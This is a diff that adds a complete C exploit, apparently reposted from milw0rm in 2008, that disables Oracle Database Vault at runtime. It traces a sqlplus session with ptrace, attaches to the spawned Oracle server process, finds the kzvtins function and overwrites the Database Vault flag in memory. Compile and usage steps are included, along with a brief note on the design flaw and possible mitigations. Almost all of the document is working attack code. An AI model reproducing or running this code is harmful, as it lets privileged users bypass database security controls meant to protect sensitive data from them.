@@ -1,0 +1,301 @@
+/*
+ * original release: http://vnull.pcnet.com.pl/blog/?p=92
+ * 
+ * ora_dv_mem_off.c version 0x1
+ * ORACLE Database Vault runtime disabler (x86_32 Linux only)
+ * AKA give_back_the_freedom
+ * by Jakub 'vnull' Wartak <jakub.wartak@gmail.com> 26.02.2008
+ * 0-day PRIVATE! D0 N0T DI$TRIBUT3!
+ *
+ * Tested on 10.2.0.3, CentOS 5. 
+ * For other architectures/OS combos consider having fun with gdb ;]
+ *
+ * Whole Database Vault architecture is flawed if DBA has access to
+ * oracle user process space. IMHO you could limit risk by creating
+ * UNIX accounts for DBAs with membership of OSDBA group (along with 
+ * oracle SUID binary and shared memory with only read permission 
+ * for OSDBA group [check SHM privs: ipcs -cm] ). But how those DBAs 
+ * would cope with some serious crashes (requiring for e.g. restoring 
+ * controlfile) ?
+ *
+ * Usage: 
+ *		Set enviorniment variables: ORACLE_BASE, ORACLE_SID, ORACLE_HOME
+ * 		$ gcc -Wall ora_dv_mem_off.c -o ora_dv_mem_off -lbfd -liberty
+ *		$ ./ora_dv_mem_off
+ *
+ * REQUIEREMENTS:
+ *	+ run as oracle process owner (by default "oracle")
+ *	+ working ptrace(), it won't work in systems with ptrace() 
+ *    disabled (grsecurity and some LKMs).
+ *	+ BFD headers and library (binutils-devel)
+ *
+ * THE DOCUMENT IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. THE
+ * CONTENT MAY CHANGE WITHOUT NOTICE. IN NO EVENT SHALL THE AUTHORS BE
+ * LIABLE FOR ANY SPECIAL, INDIRECT OR CONSEQUENTIAL DAMAGES, INJURIES,
+ * LOSSES OR UNLAWFUL OFFENCES.
+ *
+ * USE AT OWN RISK!
+ *
+ */
+#include <bfd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <sys/types.h>
+#include <sys/ptrace.h>
+#include <sys/wait.h>
+#include <linux/user.h>
+#include <linux/ptrace.h>
+#include <asm/unistd.h> /* for __NR_clone */
+
+/* you may need to alter this */
+#define ORABASE  "/u01/app/oracle/product/10.2.0/bin"
+
+/* 
+ * Magic... (at&t syntax)
+ * push %ebp
+ * mov %esp, %ebp
+ * mov <DV_FLAG>, %eax
+ * [..] 
+ * where DV_FLAG is 32-bit long
+ */
+#define ASM_DV_FUNC_PROLOG "\x55\x8b\xec\xb8"
+
+const char *sqlplus = ORABASE "/sqlplus";
+const char *oracle =  ORABASE "/oracle";
+const int long_size = sizeof(long);
+pid_t child;
+
+long locate_dv_func(void) 
+{
+	asymbol **symbol_table;
+	bfd *b = bfd_openr(oracle, NULL);
+	if (b == NULL) {
+		perror("bfd_openr");
+		exit(-1);
+	}
+
+	bfd_check_format(b, bfd_object);
+	long storage_needed = bfd_get_symtab_upper_bound(b);
+	if(storage_needed < 0) {
+		fprintf(stderr, "wtf?!\n");
+		exit(-1);
+	}
+
+	if((symbol_table = (asymbol**)malloc(storage_needed)) == 0) {
+		perror("malloc");
+		exit(-1);
+	}
+
+	int num_symbols;
+	if((num_symbols = bfd_canonicalize_symtab(b, symbol_table)) <= 0) {
+		fprintf(stderr, "no symbols info\n");
+		exit(-1);
+	}
+
+	int i;
+	for(i = 0; i < num_symbols; i++) {
+		char *symname = bfd_asymbol_name(symbol_table[i]);
+		void *symaddr = bfd_asymbol_value(symbol_table[i]);
+		/* don't even ask why this funciton, for real hardcore: gdb -p <oraclePIDs> */
+		if(!strcmp(symname, "kzvtins")) {
+			fprintf(stderr, "[%d] symbol \"kzvtins\" at 0x%lx\n", getpid(), 
+				(long) symaddr);
+			return (long) symaddr;
+		}
+	}
+
+	return 0;
+}
+
+/* from "Playing with ptrace(), part#2, Linux Journal, author: Pradeep Padala */
+void getdata(pid_t child, long addr, char *str, int len)
+{ 
+	char *laddr;
+	int i, j;
+	union u {
+		long val;
+		char chars[long_size];
+	} data;
+	i = 0;
+	j = len / long_size;
+	laddr = str;
+	while(i < j) {
+		data.val = ptrace(PTRACE_PEEKDATA, child, addr + i * 4, NULL);
+		memcpy(laddr, data.chars, long_size);
+		++i;
+		laddr += long_size;
+	}
+	j = len % long_size;
+	if(j != 0) {
+		data.val = ptrace(PTRACE_PEEKDATA,child, addr + i * 4,NULL);
+		memcpy(laddr, data.chars, j);
+	}
+	str[len] = '\0';
+}
+
+void putdata(pid_t child, long addr, char *str, int len)
+{   
+	char *laddr;
+    int i, j;
+    union u {
+            long val;
+            char chars[long_size];
+    } data;
+    i = 0;
+    j = len / long_size;
+    laddr = str;
+    while(i < j) {
+        memcpy(data.chars, laddr, long_size);
+        ptrace(PTRACE_POKEDATA, child, addr + i * 4, data.val);
+        ++i;
+        laddr += long_size;
+    }
+    j = len % long_size;
+    if(j != 0) {
+        memcpy(data.chars, laddr, j);
+        ptrace(PTRACE_POKEDATA, child, addr + i * 4, data.val);
+    }
+}
+
+void cleanup(void) 
+{
+	int s;
+	kill(child, SIGKILL);
+	wait(&s);
+}
+
+int main(int ac, char **av) 
+{
+	int status;
+	pid_t orapid = 0;
+
+	bfd_init();
+	
+	if((child = fork()) == -1) {
+		perror("fork");
+		exit(-1);
+	}
+
+	if(child == 0) {
+		if(ptrace(PTRACE_TRACEME, 0, NULL, NULL)==-1) {
+			perror("unable to ptrace(PTRACE_TRACEME)");
+			exit(-1);
+		}
+
+		/* launch sqlplus */
+		if(execl(sqlplus, "sqlplus", "/nolog", NULL)==-1) {
+			perror("execl");
+			exit(-1);
+		}
+
+		/* not reached */
+		exit(0);
+	} 
+
+	if(atexit(cleanup) != 0) {
+		fprintf(stderr, "[%d] unable to register cleanup function\n", getpid());
+	}
+
+	wait(&status);
+	if(WIFSTOPPED(status)) {
+		fprintf(stderr, "[%d] starting to trace sqlplus process (%d)\n", getpid(), child);
+	}
+
+	fprintf(stderr, "[***] NOW TYPE IN SQLPLUS: conn / as sysdba\n");
+
+	while(!orapid) {
+		struct user_regs_struct uregs;
+
+		ptrace(PTRACE_SYSCALL, child, 0, 0);
+		wait(&status);
+		ptrace(PTRACE_GETREGS, child, 0, &uregs);
+
+		/* ouch! no fork()? clone()! */
+		if(uregs.orig_eax==__NR_clone) {
+			long *regs = 0;
+
+			/* fprintf(stderr, "[%d] clone() syscall\n", getpid()); */
+			ptrace(PTRACE_SYSCALL, child, 0, 0);
+			wait(&status);
+			if((orapid = ptrace(PTRACE_PEEKUSER, child, &regs[EAX], 0)) == -1) {
+				perror("ptrace(PTRACE_PEEKUSER): unable to get clone() retvalue\n");
+				exit(-1);
+			}
+			fprintf(stderr, "[%d] clone() syscall in %d, tracing orapid=%d\n", getpid(), 
+				child, orapid);
+
+			/* attach to orapid, detach from sqlplus */
+			if(ptrace(PTRACE_ATTACH, orapid, 0, 0) == -1) {
+				perror("ptrace(PTRACE_ATTACH) to orapid");
+				exit(-1);
+			}
+
+			while(1) {
+				ptrace(PTRACE_SYSCALL, orapid, 0, 0);
+				wait(&status);
+				ptrace(PTRACE_GETREGS, orapid, 0, &uregs);
+				if(uregs.orig_eax==__NR_execve) {
+					fprintf(stderr, "[%d] execve() syscall in %d, \n", getpid(), orapid);
+					/* end ptrace of syscall */		
+					ptrace(PTRACE_SYSCALL, orapid, 0, 0);
+					break;
+				} else {
+					//fprintf(stderr, "got %ld\n", uregs.orig_eax);
+					ptrace(PTRACE_SYSCALL, orapid, 0, 0);
+				}
+			}
+
+			if(ptrace(PTRACE_DETACH, child, 0, 0) == -1) {
+				perror("ptrace(PTRACE_DETACH) from child");
+				exit(-1);
+			}
+
+		} else if(uregs.orig_eax==__NR_execve) {
+			fprintf(stderr, "[%d] execve() syscall in %d\n", getpid(), child);
+		}
+	}
+
+	/* now we have oracle server process under our control :) */
+	long dv_func = locate_dv_func();
+	if(dv_func == 0) {
+		fprintf(stderr, "ERROR: unable to find function\n");
+		exit(-1);
+	}
+	wait(&status);
+
+	unsigned char buf[32];
+	memset(buf, 0, sizeof(buf));
+	getdata(orapid, dv_func, (char *)&buf, 32);
+
+	/* dump opcodes */
+	/*
+    for(i = 0; i < 31; i++) {
+		fprintf(stderr, "%x ", (unsigned char)buf[i]);
+	} */
+	
+	if(!memcmp(buf, ASM_DV_FUNC_PROLOG, strlen(ASM_DV_FUNC_PROLOG))) {
+		unsigned char dv_status;
+		unsigned long woff = dv_func + strlen(ASM_DV_FUNC_PROLOG), woff2=woff;
+
+		getdata(orapid, woff, (char *)&dv_status, 1);
+		fprintf(stderr, "[***] sucessfuly validated function, DatabaseVault=%d\n", dv_status);
+		fprintf(stderr, "[***] attempting to rewrite memory at 0x%lx\n", woff2);
+	
+		unsigned char my = 0;
+		putdata(orapid, woff2, (void *)&my, 1);
+	}
+
+	if(ptrace(PTRACE_DETACH, orapid, 0, 0) == -1) {
+		perror("ptrace(PTRACE_DETACH) from orapid");
+		exit(-1);
+	}
+
+	wait(&status);
+	exit(0);
+}
+
+// milw0rm.com [2008-11-20]
